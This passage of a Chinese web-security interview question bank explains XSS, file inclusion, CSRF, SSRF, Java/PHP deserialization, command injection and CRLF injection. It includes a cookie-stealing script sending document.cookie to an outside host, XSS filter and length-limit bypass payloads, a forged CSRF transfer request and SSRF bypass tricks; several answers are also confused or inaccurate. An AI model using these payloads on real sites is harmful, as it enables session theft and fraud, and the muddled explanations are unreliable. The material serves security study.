href="https://www.wangan.com/docs/owasp1">OWAZP ZAP</a><br>反射型：搜索栏处。</p><ol start="6"><li>DOM XSS 原理&#x2F;防范</li></ol><p>DOM XSS原理：攻击者在网站的留言板、评论区等地方提交恶意代码；网站将恶意代码输出到页面，但未进行编码；用户访问该页面时，恶意代码会被执行。DOM XSS的危害性较大，因为它可以绕过浏览器的安全机制，直接执行恶意代码。<br>防范：<br>在使用 <code>.innerHTML、.outerHTML、document.write()</code> 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 <code>.textContent、.setAttribute()</code> 等。<br>如果用 Vue&#x2F;React 技术栈，并且不使用 <code>v-html/dangerouslySetInnerHTML</code> 功能，就在前端 render 阶段避免 <code>innerHTML、outerHTML</code> 的 XSS 隐患。<br>DOM 中的内联事件监听器，如 <code>location、onclick、onerror、onload、onmouseover</code> 等， <code>&lt;a&gt;</code> 标签的 <code>href</code> 属性，JavaScript 的 <code>eval()、setTimeout()、setInterval()</code> 等，都能把字符串作为代码运行。如果不可信的数据拼接到字符串中传递给这些 API，很容易产生安全隐患，请务必避免。</p><ol start="7"><li>DOM型XSS与反射型XSS区别？</li></ol><p>DOM型XSS攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，反射型XSS都属于服务端的安全漏洞。<br>攻击原理不同：DOM型XSS是通过修改或篡改页面的DOM结构，从而执行恶意脚本代码；反射型XSS是将恶意代码注入到URL中，当用户访问该URL时，恶意代码会被执行。<br>攻击效果不同：DOM型XSS的攻击效果更加隐蔽，更难以检测；反射型XSS的攻击效果相对较弱，比较容易被检测。<br>防范措施不同：DOM型XSS的防范措施包括使用白名单、过滤器、安全的编程规范等；反射型XSS的防范措施包括对用户输入的数据进行过滤和编码。</p><ol start="8"><li>如果SRC上报了一个XSS漏洞，payload已经写入页面，但未给出具体位置，如何快速介入？</li></ol><p>检查用户可控输入：可以使用Burp Suite等工具来模拟用户输入，并检查输出是否包含恶意代码。<br>检查HTML输出：可以使用Burp Suite等工具来检查HTML输出是否包含敏感字符和代码。<br>使用XSS扫描工具：可以使用OWASP ZAP、XSS Checker等工具来扫描网站，并检测XSS漏洞。</p><ol start="9"><li>XSS Worm 原理</li></ol><p>XSS Worm（跨站脚本蠕虫）是一种利用XSS漏洞进行传播的蠕虫。蠕虫会在受害者浏览器中执行恶意代码，并通过受害者浏览器访问其他网站，从而感染其他用户。</p><p>XSS Worm的攻击原理如下：<br>攻击者在网站的留言板、评论区等地方提交恶意代码。<br>网站将恶意代码输出到页面，但未进行编码。<br>用户访问该页面时，恶意代码会被执行。<br>恶意代码会在受害者浏览器中执行，并通过受害者浏览器访问其他网站。<br>恶意代码会在其他网站上传播，感染其他用户。</p><ol start="10"><li>有没有用过xss平台？</li></ol><p>在线平台：<a href="https://xssaq.com/login/">xssaq</a><br><a href="https://developer.aliyun.com/article/1168390">XSS平台搭建及利用</a></p><ol start="11"><li>xss如何执行代码</li></ol><p>反射型是将恶意代码注入到URL中，访问URL代码被执行。<br>存储型是将恶意代码注入到URL中，当用户访问包含恶意代码的页面时，恶意代码将会被执行。</p><ol start="12"><li>xss常用哪些标签？xss标签</li></ol><p>常用标签：<br><code>&lt;script&gt;, &lt;body&gt;, &lt;img&gt;, &lt;a&gt;, &lt;iframe&gt;, &lt;svg&gt;, &lt;input&gt;, &lt;video&gt;, &lt;style&gt; </code></p><ol start="13"><li>xss如何盗取cookie？xss如何获取cookie？</li></ol><p><code>&lt;script&gt;alert(&quot;document.cookie&quot;)&lt;/script&gt;</code><br>将以下代码封装成 <code>cookies.js</code> </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;img&quot;</span>);</span><br><span class="line">img.<span class="property">src</span> = <span class="string">&quot;http://beauty.com/log?&quot;</span> + <span class="built_in">escape</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(img);</span><br></pre></td></tr></table></figure><p>实际从网页获取cookie代码： <code>&lt;script src = xx.com/cookies.js&gt;&lt;/script&gt;</code></p><ol start="14"><li>xss有cookie一定可以无用户名密码登录吗？</li></ol><p>不一定。有几个原因：<br>(1) cookie可能已过期<br>(2) 网站可能会使用双因素认证，比如token</p><ol start="15"><li>XSS除了获取cookie，还有别的用处吗?</li></ol><p>见问题1</p><ol start="16"><li>xss的危害，可能存在的地方？</li></ol><p>xss危害：见问题1<br>可能存在的地方：见问题5</p><ol start="17"><li>xss漏洞测试方法</li></ol><p>手动测试（相对准确，效率较低）：<br>识别可能存在 XSS 漏洞的输入字段。重点考虑数据输入的地方<br>尝试在输入字段中输入各种类型的恶意代码。比如 <code>&lt;, &gt;, ()</code> 等，提交后查看网页源代码的变化以发现输入被输出到什么地方<br>观察浏览器的响应，查看是否存在恶意代码被执行的情况。</p><p>自动测试：<br>选择合适的自动化工具。如：AVWS，BurpSuite，XSSer，XSSF，BeEF，beef-xss，XSStrike<br>配置自动化工具。<br>运行自动化工具。<br>分析自动化测试的结果，查看是否存在 XSS 漏洞。</p><ol start="18"><li>xss如何绕过安全防范</li></ol><p>使用Unicode编码：将字符转为unicode集，从而绕过过滤器。<br>使用混淆技术：混淆技术可以将恶意代码混淆，从而绕过过滤器。<br>使用漏洞利用工具：帮助攻击者自动化绕过安全防范措施。</p><ol start="19"><li>XSS form框限制长度的绕过？XSS限制长度，XSS长度限制<br>1、利用事件(Event)来缩短所需的字节数：<br><code>&quot; onclick=alert(1) //</code><br>实际输出: <code>&lt;input type=&quot;text&quot; value=&quot;&quot; onlick=alert(1) //&quot;/&gt;</code></li></ol><p>2、把XSS Payload写到别处，再通过简短的代码加载这段XSS Payload<br>常用的藏身处: <code>location.hash</code><br>hash属性是一个可读可写的字符串，该字符串是URL的锚部分（从#开始的部分）<br>实例：<br><code>&quot;onclick=&quot;eval(location.hash.sustr(1))</code><br>构造url: <code>http://ww.a.com/test.html#alert(1)</code><br>当用户点击 “location.hash”里的alert(1)就会执行了。</p><p>3、利用注释符绕过长度限制<br>比如我们能够控制两个文本框,  第二个文本框允许写入更多的字符。此时利用HTML的注释符号,  把两个文本框之间的HTML代码全部注释掉,  从而”打通” 两个input标签。<br>原HTML:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input id=1 type=&quot;text&quot; value=&quot;$var1&quot; /&gt;</span><br><span class="line">&lt;input id=2 type=&quot;text&quot; value=&quot;$var2&quot; /&gt;</span><br></pre></td></tr></table></figure><p>在第一个input框中输入:<br><code>&quot;&gt; &lt;!--</code><br>在第二个input框中输入：<br><code>--&gt; &lt;script&gt;alert(1)&lt;/script&gt;</code><br>最终的效果是:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input id=1 type=&quot;text&quot; value=&quot;&quot;&gt; &lt;!-- /&gt;</span><br><span class="line">&lt;input id=2 type=&quot;text&quot; value=&quot;--&gt; &lt;script&gt;alert(1)&lt;/script&gt;&quot; /&gt;</span><br></pre></td></tr></table></figure><p>4、尝试找一些特殊字符（或许可以从希腊字典中找到），能起到1个字符代替2个字符，或者绕过安全限制的效果。<br><code>&lt;script/src=//⑭.₨&gt;</code><br>解析时会变成: <code>14.rs</code></p><p><a href="https://blog.csdn.net/angry_program/article/details/104753335">XSS 绕过长度限制的一些小技巧</a><br><a href="https://nosec.org/home/detail/3206.html">在XSS测试中如何绕过字符长度限制</a></p><ol start="20"><li>XSS代码层防御xss防御<br>1、对用户输入和URL参数进行过滤，对输出进行编码<br>2、对用户所有提交内容进行验证，包括URL、查询关键字、HTTP头、POST数据等<br>3、仅接受指定长度范围内、采用适当格式、采用所预期的字符的内容提交<br>4、在变量值输出到前端的HTML时进行编码和转义，对特殊字符进行过滤和转义<br>5、给关键的cookie使用http-only</li></ol><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><ol><li>php的LFI，本地包含漏洞原理是什么？写一段带有漏洞的代码，手工的话如何发掘？如果无本地报错回显，如何遍历文件？</li></ol><p>PHP本地包含漏洞原理：包含文件设置为变量，无过滤或过滤不严导致可调用恶意文件，还可以对远程文件包含。攻击者通过控制包含函数，如include(), require()等，加载服务器本地上的PHP脚本文件，配合任意文件上传漏洞，将恶意文件上传进服务器中，再通过本地文件包含执行该恶意脚本达到获得网站控制权的目的。<br>手工发掘文件包含漏洞：查找包含函数的使用，分析文件名是否来自用户输入，如果文件名未过滤可以尝试包含恶意文件。<br>存在漏洞却没有回显：有可能没显示在页面而是在源码中，可以利用DNSlog进行获取包含的信息。从index.php文件一级级读取。也可利用PHP封装协议读取文件。</p><ol start="2"><li>PHP和Java的文件包含区别</li></ol><p>PHP的文件包含：通常使用 <code>include</code> , <code>require</code> 两个函数实现。 <code>include</code> 函数包含文件不存在时会产生警告，但不会终止脚本的执行； <code>require</code> 函数在包含文件不存在时会产生致命错误，并终止脚本的执行。<br>PHP的文件包含功能可以包含任何文件。当包含PHP文件时，PHP解释器会将包含文件的代码解析并执行。因此，如果攻击者可以控制包含文件的内容，则可以利用文件包含漏洞来执行任意代码，从而获得系统权限。</p><p>Java的文件包含：Java的文件包含功能使用 <code>Class.getResource()</code> 来实现。 <code>Class.getResource()</code> 方法可以获取类路径下的资源文件，包括文件、图片、音频等。<br>Java的文件包含功能只能包含类路径下的资源文件。如果攻击者可以控制类路径下的资源文件，则可以利用文件包含漏洞来读取敏感信息，例如配置文件、源代码等。</p><p>区别：<br>PHP的文件包含更灵活，能包含任意文件；Java的文件包含只能包含类路径下的资源文件。<br>PHP的文件包含功能可以执行代码；Java的文件包含只能执行文件。<br>因此PHP的文件包含漏洞更严重。</p><ol start="3"><li>文件包含以及变量覆盖</li></ol><p>变量覆盖指的是可以用我们的传参值替换程序原有的变量值。<br>常见变量覆盖漏洞： <code>extract(), parse_str(), $$</code><br>变量覆盖实现方式：直接赋值，使用函数，使用运算符<br>变量覆盖可以用于实现不同的功能。，例如：改变变量的值，重置变量的值，删除变量的值。<br>如果攻击者可以控制传入的参数，则可以利用变量覆盖来修改程序的关键变量值，从而实现攻击目标。<br>常见变量覆盖漏洞：参数污染，注入攻击，缓冲区溢出<br>防止变量覆盖漏洞采取的措施：使用安全编码规范，对参数进行严格的验证，使用安全框架或安全工具。</p><ol start="4"><li>文件包含漏洞攻击原理及分类 文件包含漏洞原理 文件包含</li></ol><p>原理：文件包含函数加载的参数未经过过滤或严格的定义，可以被用户控制，包含其它恶意文件，导致执行非预期代码。<br>分类：远程文件包含（RFI），本地文件包含（LFI）</p><ol start="5"><li>如何快速挖掘包含漏洞</li></ol><p>可以使用自动化工具：OWASP ZAP，Burp Suite，W3AF<br>或者手动分析源代码：尝试使用别人已公布的nday，自行写脚本或用别人已写好的脚本；使用含糊测试，传入各种含糊数据；尝试包含各种类型文件，如html，css，js等；尝试包含目录中的文件，触发目录遍历漏洞；尝试包含系统文件，如配置文件、源代码等；尝试包含远程文件，以执行任意代码。</p><ol start="6"><li>包含漏洞具体能做什么，怎么绕过？</li></ol><p>具体能做：执行任意代码，读取敏感信息，影响应用程序正常执行。<br>绕过方式：<br>本地文件包含漏洞绕过: <code>%00</code> 截断，路径长度截断，点号截断，<br>远程文件包含漏洞绕过: 问号绕过，#号绕过，空格绕过</p><ol start="7"><li>导致文件包含的函数</li></ol><p>PHP：include(), include_once(), require(), require_once(), fopen(), readfile()<br>JSP&#x2F;Servlet: ava.io.File(), java.io.FileReader()<br>ASP: include file, include virtual</p><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><ol><li>CSRF如何不带referer访问</li></ol><p>(1) 使用空Referer头：将Referer头设置为空，这样请求就不会被拒绝。<br>(2) 使用其它协议：如 <code>ftp://  http://  file://  javascript:  data:</code></p><ol start="2"><li>CSRF成因及防御措施；如果不用token如何做防御？</li></ol><p>CSRF攻击的成因：<br>HTTP协议是无状态的：每个请求独立，与之前的请求无关。服务器无法追踪之前的请求来判断当前请求是否来自受信任的来源。<br>Web的隐式身份验证机制。Web的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是否是用户批准发送的。<br>用户的浏览器会自动发送cookie：即使用户未意识到，浏览器也会发送cookie，从而泄露用户的身份信息。</p><ol start="3"><li>CSRF有何危害？</li></ol><p>执行任意操作：比如转账，修改密码，发布信息等<br>窃取敏感信息：如银行卡号，密码等<br>破坏网站功能：发送垃圾邮件，发布恶意内容等</p><ol start="4"><li>如何防止CSRF？</li></ol><p>(1) 阻止不明外域访问，采用同源策略 Samesite Cookie<br>(2) 使用token，分布式校验<br>(3) 使用双因素认证<br>(4) 使用安全框架或安全工具</p><ol start="5"><li>CSRF的原理及防御</li></ol><p>原理：CSRF攻击通常通过发送带有恶意请求的链接或表单来进行。当受害者点击链接或提交表单时，恶意请求就会被发送到目标网站。如果目标网站没有采取措施防止CSRF攻击，那么恶意请求就会被执行，并导致受害者执行攻击者的操作。<br>防御：见问题4</p><ol start="6"><li>一种特殊的CSRF场景：后端只解析json格式的时候如何利用CSRF（非更改Content-Type）</li></ol><p>利用XSS漏洞或DOM XSS，然后利用恶意代码来发送CSRF请求<br>利用JSON请求嵌入到一个HTML或CSS中，当访问该页面时，恶意的JSON请求就会发送到服务器。<br>首先需要获得受害者的cookie和token等需要验证身份的信息，然后构造一个JSON CSRF攻击(以银行体系为例)：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">POST</span> /api/transfer <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Host</span>: examplebank.<span class="property">com</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: application/json</span><br><span class="line"><span class="title class_">Cookie</span>: session_id=&lt;<span class="variable constant_">USER_SESSION_ID</span>&gt;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">   <span class="string">&quot;token&quot;</span>: <span class="string">&quot;&lt;UI_TOKEN&gt;&quot;</span>,</span><br><span class="line">   <span class="string">&quot;to_account&quot;</span>: <span class="string">&quot;&lt;ATTACKER_ACCOUNT&gt;&quot;</span>,</span><br><span class="line">   <span class="string">&quot;amount&quot;</span>: <span class="string">&quot;-100000&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用js打fetch这类</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;https://example.com/post-data&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">  <span class="attr">headers</span>: &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;x-csrf-token&#x27;</span>: token <span class="comment">// 从上面获取到的 CSRF Token</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">    <span class="comment">// POST 请求的数据</span></span><br><span class="line">    <span class="attr">foo</span>: <span class="string">&#x27;bar&#x27;</span></span><br><span class="line">  &#125;),</span><br><span class="line">  <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span> <span class="comment">// 传递 cookies</span></span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> res.<span class="title function_">text</span>())</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function"><span class="params">body</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 处理响应</span></span><br><span class="line">  &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="7"><li>SameSite</li></ol><p>SameSite是HTTP Cookie属性，用于限制cookie在跨站点请求中的传输，以防止web应用程序遭受CSRF攻击。SameSite属性可以设置为以下三个值：<br>None: Cookie可以跨站点传输，Lax: Cookie可以从同一域或同源子域发出的站点请求中跨站点传输。Strict: Cookie仅限于在同一域内的请求中传输。</p><ol start="8"><li>csrf攻击原理是什么，一般用什么工具进行检测</li></ol><p>原理：见问题5<br>探测工具：CSRF Tester, BurpSuite, OWASP CSRFGuard</p><ol start="9"><li>为什么token能防止CSRF攻击？token在请求包中的位置？<br>token 验证的规则是，服务器从请求体（POST）或者请求参数（GET）中获取设置的 token，然后和 Cookie 中的 token 进行比较，一致之后才执行请求。</li></ol><p>而 CSRF 攻击只是借用了 Cookie，并不能获取 Cookie 中的信息，所以不能获取 Cookie 中的 token，也就不能在发送请求时在 POST 或者 GET 中设置 token，把请求发送到服务器端时，token 验证不通过，也就不会处理请求了。</p><p>token在请求包中的session中。</p><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><ol><li>SSRF漏洞的成因 防御 绕过</li></ol><p>成因：服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制。<br>防御：请求地址严格过滤，用正则表达式或黑名单。过滤放回信息。统一错误信息，避免攻击者可通过错误信息判断远程服务器端口的状态。限制请求的端口为http常用端口(如 80 443 8080 8090)。黑名单内网IP。禁用不需要的协议（仅允许http&#x2F;https）。使用隔离区，对外发起的请求放置在隔离区中进行严格的安全管控。内部系统使用代理来转发请求，防止攻击者直接访问目标地址。及时修复服务端漏洞，定期进行安全审计，关注安全动态。<br>绕过：<br>如果限制为 <code>http://www.xxx.com</code> 域名，使用绕过方式为 <code>http://www.xxx.com@www.xxc.com</code><br>如果限制请求IP不为内网地址，可采用绕过方式为：短地址，特殊域名，进制转换<br>如果限制请求只为http协议，可采用绕过方式为：采取302跳转，采取短地址<br>常用绕过方式：利用302跳转，进制转换，利用DNS解析，利用@绕过，利用[::]，添加端口号，利用短网址，其它各种指向127.0.0.1的地址，中文句号代替点号，利用IDN</p><ol start="2"><li>介绍SSRF漏洞，如何深入利用？如何探测非HTTP协议？如何防范？</li></ol><p>介绍SSRF漏洞：服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。</p><p>深入利用：获取敏感信息（如Redis未授权，MySQL未授权等），执行恶意操作（如上传文件，执行命令，修改数据等），控制外部系统（如web服务，数据库，文件系统等），进行攻击链（与RCE，数据库，文件上传，XSS等漏洞结合实现更大攻击效果）</p><p>探测非HTTP协议：<br>(1) 使用burpsuite的intruder，然后在payloads选择要使用的payload，在scope指定测试的url，在attack选择request method为post，在payload options处选择body data为gopher。<br>(2) 在dnslog创建一个新的域名，在服务端构造恶意请求，将url设置为dnslog的域名，在客户端发送恶意请求，如果服务器支持gopher协议则会向dnslog发送一个gopher协议的请求，dnslog会记录并将结果返回。</p><ol start="3"><li>SSRF利用点</li></ol><p>利用点：<br>内网服务（如Apache Hadoop远程命令执行，dict，docker API远程命令执行等）<br>Redis利用（如写ssh公钥，写crontab，写webshell，Windows启动项，主从复制加载.so文件，主从复制写无损文件）<br>云主机（通过访问云环境的元数据或管理API，部分情况下实现敏感信息等效果）<br>URL中：share, wap, url, link, src, source, target, u, 3g, display, sourceURI, ImageURL, domain,<br><a href="https://websec.readthedocs.io/zh/latest/vuln/ssrf.html">SSRF利用点</a></p><ol start="4"><li>ssrf的原理即后利用，怎么执行命令，常搭配使用的协议。</li></ol><p>在 SSRF 漏洞的后利用中，常见的方法是利用内网开放端口执行命令。攻击者可以通过 SSRF 漏洞将请求发送到内网的服务器，并执行任意命令。例如，攻击者可以将请求发送到内网的 SSH 服务器，并通过 SSH 协议连接到目标站点，从而获得对目标站点的控制权。这种方法的优点是比较简单易行，不需要攻击者构造复杂的请求。缺点是需要目标站点有内网开放的端口。<br>常搭配使用的协议：gopher, dict, file, http&#x2F;s,</p><ol start="5"><li>ssrf漏洞攻击原理，用途</li></ol><p>原理：服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制。<br>用途：SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。</p><ol start="6"><li>说说如何挖掘ssrf漏洞</li></ol><p>挖掘：<br>首先查看常见场景：url地址进行网页分享，转码服务，图片加载与下载，未公开的api实现以及其它调用url的功能等<br>ssrf产生漏洞的函数： <code>file_get_contents(),  fsockopen(), curl_exec()</code></p><ol start="7"><li>SSRF对输入做了ipv4的正则过滤，有什么bypass方式？<br>1、DNS Rebinding绕过<br>2、IP双重绑定绕过</li></ol><h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><ol><li>Java反序列化基础</li></ol><p>Java反序列化是将Java对象从字节流中恢复的过程。反序列化过程主要分为2步：<br>(1) 读取字节流，根据序列化规格提取对应的类<br>(2) 利用反射实例化获得对象</p><p>序列化对象的格式<br>Flag | data | flag | data</p><p>Java程序中类ObjectInputStream的readObject方法被用来将数据流反序列化为对象，如果流中的对象是class，则它的ObjectStreamClass描述符会被读取，并返回相应的对象，ObjectStreamClass包含了类的名称及serialVersionUID。</p><p>对象能够成功的反序列化是因为和序列化的时候使用的协议是一样的，对应到Java反序列化中这里的协议指的就是serialVersionUID</p><p>Java反序列化漏洞是指在Java反序列化过程中，攻击者可以利用恶意对象的readObject方法来执行任意代码。Java反序列化漏洞通常出现在以下场景：<br>第三方库中存在漏洞<br>开发人员在开发过程中不小心导致了漏洞</p><p>利用方式主要有以下几种：<br>远程代码执行，恶意文件读取，任意文件写入</p><p>防范措施：<br>白名单机制，只允许反序列化特定的类<br>使用安全的序列化库<br>开发人员在开发过程中注意避免漏洞</p><ol start="2"><li>Java反序列化有哪些CC链是有回显的？</li></ol><p>Java反序列化CC链是指利用Java反序列化漏洞执行恶意代码的链条。cc链通常由多个类组成，每个类都负责执行特定的任务，最终达到执行恶意代码的目的。<br>有回显的CC链包括：<br>JNDI回显：利用JNDI服务将恶意代码执行结果输出到指定位置。<br>异常抛出回显：利用恶意代码抛出异常，并将异常信息输出到指定位置。<br>写文件回显：将恶意代码执行结果写入到指定文件中。<br>DNSlog回显：将恶意代码执行结果发送到指定的DNSlog服务器。</p><ol start="3"><li>Java反序列化相关的协议？</li></ol><p>Java Serialization Protocol: 将对象转换为字节流的协议。该协议定义了对象序列化过程中，需要保存对象的类名和类属性。<br>Externalizable Protocol: 将对象转换为字节流的协议。允许对象在序列化和反序列化过程中自定义序列化逻辑。</p><ol start="4"><li>Fastjson反序列化及如何修复？fastjson注入</li></ol><p>FastJson 是一个由阿里巴巴研发的java库，可以把java对象转换为JSON格式，也可以把JSON字符串转换为对象。<br>fastjson反序列化漏洞的利用方式主要有：利用类重写漏洞，利用链式反序列化漏洞，利用反序列化回显漏洞。<br>FastJson&lt;1.2.24:<br>JdbcRowSetlmpl类+JNDI(出网)<br>FastJsonBcel类+动态类加载(不出网)<br>FastJson&lt;&#x3D;1.2.47:</p><ol start="5"><li>Java反序列化的原理</li></ol><p>见问题1</p><ol start="6"><li>讲讲yso的链</li></ol><p>yso链是用于Java反序列化攻击的利用链。yso链是通过将多个Java类链接在一起，从而实现执行任意代码的目的。<br>yso链通常由以下几部分组成：<br>反序列化触发类：该类负责触发反序列化过程。<br>反序列化漏洞类：该类存在反序列化漏洞，攻击者可以利用该漏洞来执行任意代码。<br>执行代码类：该类负责执行攻击者指定的代码。</p><p>yso链的具体实现方法有：<br>CommonsCollections3链：该链利用Apache Commons Collection 3.1中的反序列化漏洞来执行任意代码。<br>fastjson链：该链利用FastJson中的反序列化漏洞来执行任意代码。<br>JNDI链：该链利用JNDI服务来执行任意代码。</p><p>可用来控制服务器，获取敏感信息，进行数据篡改等</p><p>防范措施：<br>升级JDK和第三方库到最新版本。<br>使用白名单机制：只允许反序列化特定的类和对象。<br>使用安全的网络协议：如HTTPS，避免使用HTTP<br>使用安全的web应用程序框架：如Spring Boot, Jetty等。</p><ol start="7"><li>shiro反序列化原理</li></ol><p>shiro版本：1.2.4<br>Apache Shiro框架提供了一个RememberMe的功能，这个功能在用户登陆成功后，会生成一个加密后的cookie，返回包 set-Cookie 会有 rememberMe&#x3D;deleteMe 字段。其中记住我的RememberMe就是cookie中的key。cookie的值是对相关信息进行反序列化，再进行AES加密，再使用base64编码之后形成的。<br>服务端接收cookie值时，也是按以下步骤解析的：<br>检索RememberMe cookie的值，base64解码，再使用AES解码（加密密钥硬编码），最后进行反序列化操作（未作过滤处理）。</p><p>在调用反序列化时未进行任何过滤，导致可以触发远程代码执行漏洞。<br>AES的密钥key被硬编码在代码里，意味着每个人通过源代码都能拿到AES加密的密钥。<br>因此，攻击者构造一个恶意的对象，并且对其序列化，AES加密，base64编码后，作为cookie的RememberMe字段发送。Shiro将RememberMe进行解密并且反序列化，最终造成反序列化漏洞。</p><p>Shiro 1.2.4 以上版本官方移除了代码中的默认密钥，要求开发者自己设置，如果开发者没有设置，则默认动态生成，降低了固定密钥泄漏的风险。<br><a href="https://drun1baby.top/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/">Java反序列化Shiro篇01-Shiro550流程分析</a></p><ol start="8"><li>反序列化原理</li></ol><p>未对反序列化接口做访问控制，未对反序列化数据做加密和签名，加密密钥使用硬编码，使用不安全的反序列化框架库或函数的情况，由于反序列化数据可被用户控制，攻击者可以精心构造恶意的序列化数据（执行特定代码或命令）传递给应用程序，在应用程序反序列化对象时执行攻击者构造的恶意代码，达到攻击者的目的。</p><ol start="9"><li>PHP反序列化漏洞原理<br>未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行，SQL注入，目录遍历等不可控后果。</li></ol><p>在反序列化的过程中自动触发了某些魔术方法。 而在反序列化时，如果反序列化对象中存在魔法函数，使用unserialize()函数同时也会触发。</p><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><ol><li>命令注入有哪些</li></ol><p>代码层过滤不严造成的命令注入：如 <code>system(&quot;/bin/program --arg $arg&quot;);</code><br>系统漏洞造成命令注入：如bash破壳漏洞<br>调用的第三方组件存在代码执行漏洞：如thinkphp5.x的命令执行</p><p>SQL注入<br>OS命令注入<br>LDAP注入<br>JNDI注入</p><ol start="2"><li>命令执行漏洞原理<br>命令执行漏洞是指应用有时需要调用一些执行系统命令的函数，如：system()、exec()、shell_exec()、eval()、passthru()，代码未对用户可控参数做过滤，当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击。</li></ol><h1 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h1><ol><li>CRLF注入原理。</li></ol><p>CRLF(Carriage-Return Line-Feed 回车换行)，用字符表示即为 <code>\r\n</code><br>在http当中http的header和body之间就是用两个crlf进行分隔的。如果能控制http消息头中的字符，注入一些恶意的换行，这样就能注入一些会话cookie和html代码，所以CRLF Injection又叫做HTTP Response Splitting(HTTP响应拆分漏洞，简称HRS)，CRLF漏洞可以造成 Cookie会话固定 和 反射型XSS(可过WAF) 的危害。<br>注入XSS的利用方式：连续使用两次%0d%0a就会造成header和body之间的分离，就可以在其中插入xss代码形成反射型xss漏洞。</p><p>HRS漏洞存在的前提是：url当中输入的字符会影响到文件，比如在重定位当中可以尝试使用%0d%0a作为crlf。<br>一般网站会在HTTP头中加入 <code>Location: http://example.com</code> 的方式来进行302跳转，所以我们能控制的内容就是Location后面的网址，对这个地址进行污染。</p><p>原理：类似于XSS，利用Web应用程序对CRLF结束标记进行欺骗的攻击手法。当未对HTTP参数或URL进行过滤时，攻击者通过在HTTP协议头中注入恶意的CRLF字符，欺骗web服务器将请求分割为两个部分，其中第二部分被认为是新的请求。导致攻击者在新的HTTP请求中注入恶意代码，例如恶意重定向，cookie欺骗，会话劫持等。</p><ol start="2"><li>如何绕过CDN获取目标网站真实IP？</li></ol><p>CDN(Content Delivery Network，内容分发网络)是一种通过在多个地理位置部署服务器来缓存静态内容（如图片、CSS、Javascript、HTML等）并提供更快的访问速度的技术。CDN可以保护网站免受攻击，但也可能会导致攻击者无法获取目标网站的真实IP。<br>绕过CDN获取目标网站真实IP的方法：<br>(1) 利用DNS历史解析记录。CDN通常会将目标网站的域名解析到多个CDN节点的IP地址。如果目标网站以前没有使用CDN，那么在DNS历史解析记录中可能仍会保留其真实的IP地址。相关查询网站： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">iphistory: https://viewdns.info/iphistory/</span><br><span class="line">DNS查询: https://dnsdb.io/zh-cn/</span><br><span class="line">微步在线: 